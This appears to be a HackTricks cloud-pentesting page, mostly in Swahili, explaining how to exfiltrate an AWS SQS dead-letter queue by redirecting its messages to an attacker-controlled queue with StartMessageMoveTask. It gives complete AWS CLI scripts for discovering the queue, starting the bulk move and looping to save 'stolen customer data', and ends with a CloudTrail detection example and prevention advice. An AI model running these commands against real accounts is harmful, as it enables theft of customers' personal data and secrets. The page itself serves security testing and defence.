# AWS â€“ SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Maelezo

Tumia vibaya message move tasks za SQS ili kuiba ujumbe wote uliokusanywa kwenye Dead-Letter Queue (DLQ) ya mwathirika kwa kuwakilisha kuwa zinaelekezwa kwenye foleni inayodhibitiwa na mshambuliaji kwa kutumia `sqs:StartMessageMoveTask`. Mbinu hii inatumia kipengele halali cha AWS cha kurejesha ujumbe ili exfiltrate data nyeti iliyokusanywa ndani ya DLQs kwa muda.

## Je, Dead-Letter Queue (DLQ) ni nini?

Dead-Letter Queue ni foleni maalum ya SQS ambapo ujumbe hupelekwa moja kwa moja wakati hayafanikiwi kuchakatwa ipasavyo na programu kuu. Ujumbe hizi zilizoshindwa mara nyingi zina:
- Data nyeti za programu ambazo hazikuweza kuchakatwa
- Maelezo ya hitilafu na taarifa za debugging
- Taarifa za Kimuonekano Binafsi (PII)
- API tokens, nyaraka za utambulisho, au siri nyingine
- Data muhimu za muamala wa biashara

DLQs hufanya kazi kama "makaburi" ya ujumbe ulioshindwa, na kuzipa thamani kwa sababu zinaweza kukusanya data nyeti kwa muda ambayo programu zilishindwa kushughulikia ipasavyo.

## Senario ya Shambulio

**Mfano wa ulimwengu halisi:**
1. **Programu ya e-commerce** inashughulikia maagizo ya wateja kupitia SQS
2. **Baadhi ya maagizo yanashindwa** (masuala ya malipo, uhaba wa bidhaa, n.k.) na yanahamishwa kwenye DLQ
3. **DLQ inakusanya** wiki/miezi ya maagizo yaliyoshindwa yenye data ya mteja: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Mshambuliaji anapata ufikiaji** wa credentials za AWS zenye ruhusa za SQS
5. **Mshambuliaji anagundua** kwamba DLQ ina maelfu ya maagizo yaliyoshindwa yenye data nyeti
6. **Badala ya kujaribu kufikia ujumbe mmoja mmoja** (polepole na kuonekana), mshambuliaji anatumia `StartMessageMoveTask` kuhamisha kwa wingi UNAO ujumbe wote kwenye foleni yake mwenyewe
7. **Mshambuliaji anachota** data nyeti ya kihistoria yote kwa operesheni moja

## Mahitaji
- Foleni ya chanzo lazima iwe imewekwa kama DLQ (irejewe na angalau foleni moja kwa RedrivePolicy).
- Ruhusa za IAM (endeshwa kama principal wa mwathirika aliyeathiriwa):
- Katika DLQ (chanzo): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Katika foleni ya marudio: ruhusa za kuwasilisha ujumbe (km, sera ya foleni ikiruhusu `sqs:SendMessage` kutoka kwa principal wa mwathirika). Kwa marudio ndani ya akaunti hiyo hiyo hii kwa kawaida inaruhusiwa kwa default.
- Ikiwa SSE-KMS imewezeshwa: kwenye CMK ya chanzo `kms:Decrypt`, na kwenye CMK ya marudio `kms:GenerateDataKey`, `kms:Encrypt`.

## Athari
Exfiltrate payloads nyeti zilizokusanywa katika DLQs (matukio yaliyoshindwa, PII, tokens, payloads za programu) kwa kasi kubwa kwa kutumia API za asili za SQS. Inafanya kazi cross-account ikiwa sera ya foleni ya marudio inaruhusu `SendMessage` kutoka kwa principal wa mwathirika.

## Jinsi ya Kutumia Vibaya

- Tambua ARN ya DLQ ya mwathirika na uhakikishe kuwa kwa kweli inatajwa kama DLQ na foleni fulani (foleni yoyote inatosha).
- Tengeneza au chagua foleni inayodhibitiwa na mshambuliaji na upate ARN yake.
- Anzisha message move task kutoka DLQ ya mwathirika hadi foleni yako ya marudio.
- Fuata maendeleo au ghatia kama inahitajika.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Mshambuliaji ameiba credentials za AWS na kugundua kwamba programu ya e-commerce inatumia SQS na DLQ yenye jaribio zilizoshindwa za usindikaji wa maagizo ya wateja.

1) **Gundua na chunguza DLQ ya mwathirika**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Unda queue ya marudio inayodhibitiwa na mshambuliaji**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Tekeleza wizi wa ujumbe kwa wingi**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Kukusanya data nyeti zilizoporwa**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Vidokezo vya kuvuka akaunti
- Queue ya marudio lazima iwe na resource policy inayoruhusu principal wa mwathiriwa kufanya `sqs:SendMessage` (na, ikiwa inatumiwa, mapatano/idhinishaji ya KMS).

## Kwa Nini Shambulio Hili Linafanikiwa

1. **Legitimate AWS Feature**: Inatumia utendakazi uliojengwa ndani ya AWS, na hivyo kufanya ugunduzi wa kibaya kuwa mgumu  
2. **Operesheni za wingi**: Huhamisha maelfu ya ujumbe kwa haraka badala ya ufikiaji wa polepole wa ujumbe mmoja mmoja  
3. **Historical Data**: DLQs hukusanya data nyeti kwa wiki au miezi  
4. **Under the Radar**: Mashirika mengi hayafuatilii upatikanaji wa DLQ kwa umakini  
5. **Cross-Account Capable**: Inaweza exfiltrate kwenda kwenye akaunti ya AWS ya mshambuliaji ikiwa idhinisho linaruhusu

## Ugunduzi na Kuzuia

### Ugunduzi
Fuatilia CloudTrail kwa wito wa API `StartMessageMoveTask` zisizo za kawaida:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Kuzuia
1. **Least Privilege**: Punguza ruhusa za `sqs:StartMessageMoveTask` kwa majukumu muhimu tu
2. **Monitor DLQs**: Weka alarma za CloudWatch kwa shughuli zisizo za kawaida za DLQ
3. **Cross-Account Policies**: Kagua kwa makini sera za foleni za SQS zinazoruhusu upatikanaji wa kuvuka akaunti
4. **Encrypt DLQs**: Tumia SSE-KMS kwa sera za ufunguo zilizo na vizuizi
5. **Regular Cleanup**: Usiruhusu data nyeti kujikusanya katika DLQs kwa muda usioyokoma

{{#include ../../../banners/hacktricks-training.md}}
